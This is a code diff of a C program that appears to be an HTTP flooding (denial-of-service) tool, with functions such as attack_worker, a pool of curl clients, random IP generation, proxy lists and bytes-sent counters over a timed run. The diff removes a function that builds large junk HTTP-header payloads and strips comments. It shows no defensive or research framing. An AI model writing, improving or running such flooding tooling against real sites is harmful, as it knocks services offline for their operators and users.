@@ -142,52 +142,6 @@ char* random_ip() {
     return ip;
 }
 
-char* generate_large_payload(int *size) {
-    *size = rand_int(1024 * 100, MAX_PAYLOAD_SIZE);
-    char *payload = malloc(*size + 1);
-    if (!payload) return NULL;
-    
-    const char *patterns[] = {
-        "POST", "PUT", "PATCH", "DELETE", "GET", "HEAD", "CONNECT", "OPTIONS",
-        "HTTP/1.1", "HTTP/2.0", "Host:", "User-Agent:", "Accept:", "Content-Type:",
-        "X-Forwarded-For:", "X-Real-IP:", "Cookie:", "Referer:", "Origin:", "Authorization:",
-        "Bearer", "Basic", "Digest", "Negotiate", "NTLM", "Kerberos"
-    };
-    
-    int pos = 0;
-    while (pos < *size) {
-        const char *pattern = patterns[rand_int(0, 25)];
-        int pattern_len = strlen(pattern);
-        int remaining = *size - pos;
-        
-        if (remaining > pattern_len + rand_int(2, 10)) {
-            memcpy(payload + pos, pattern, pattern_len);
-            pos += pattern_len;
-            if (rand_bool()) {
-                payload[pos++] = '\r';
-                payload[pos++] = '\n';
-            } else {
-                payload[pos++] = ' ';
-                payload[pos++] = ':';
-                payload[pos++] = ' ';
-                if (rand_int(0, 1)) {
-                    char *tmp = random_string(rand_int(5, 20));
-                    if (tmp) {
-                        payload[pos++] = tmp[0];
-                        free(tmp);
-                    }
-                }
-                payload[pos++] = '\r';
-                payload[pos++] = '\n';
-            }
-        } else {
-            payload[pos++] = 'A' + (rand() % 26);
-        }
-    }
-    payload[*size] = '\0';
-    return payload;
-}
-
 char* generate_custom_path() {
     char *result = malloc(MAX_URL_LEN);
     if (!result) return NULL;
@@ -355,6 +309,8 @@ CURL* pool_get_client(ConnectionPool *pool) {
 }
 
 void attack_worker(const char *target, const char *host, ConnectionPool *pool) {
+    (void)host; // Suppress unused parameter warning
+    
     CURL *curl = pool_get_client(pool);
     char full_url[MAX_URL_LEN];
     char *path = generate_custom_path();
@@ -443,7 +399,6 @@ void attack_worker(const char *target, const char *host, ConnectionPool *pool) {
     pthread_mutex_unlock(&bytes_sent.mutex);
     
     curl_slist_free_all(headers);
-    // Don't cleanup curl handle - it belongs to the pool
     free(path);
 }
 
@@ -458,7 +413,7 @@ void* worker_thread(void *arg) {
 }
 
 void* stats_display(void *arg) {
-    (void)arg; // Suppress unused parameter warning
+    (void)arg;
     
     while (running) {
         sleep(1);
@@ -614,13 +569,11 @@ int main(int argc, char *argv[]) {
     sleep(cfg.duration_sec);
     running = false;
     
-    // Give workers time to finish current requests
     printf(COLOR_YELLOW "\n[!] Waiting for workers to finish...\n" COLOR_RESET);
-    usleep(500000); // 0.5 seconds
+    usleep(500000);
     
     cleaning_up = true;
     
-    // Join all worker threads
     for (int i = 0; i < MAX_WORKERS; i++) {
         pthread_join(workers[i], NULL);
     }
@@ -645,7 +598,6 @@ int main(int argc, char *argv[]) {
     printf(COLOR_RED "    ╚════════════════════════════════════════════════════════════╝\n");
     printf(COLOR_RESET);
     
-    // Clean up in correct order
     cleanup_connection_pool(connection_pool);
     
     if (proxy_list.proxies) {
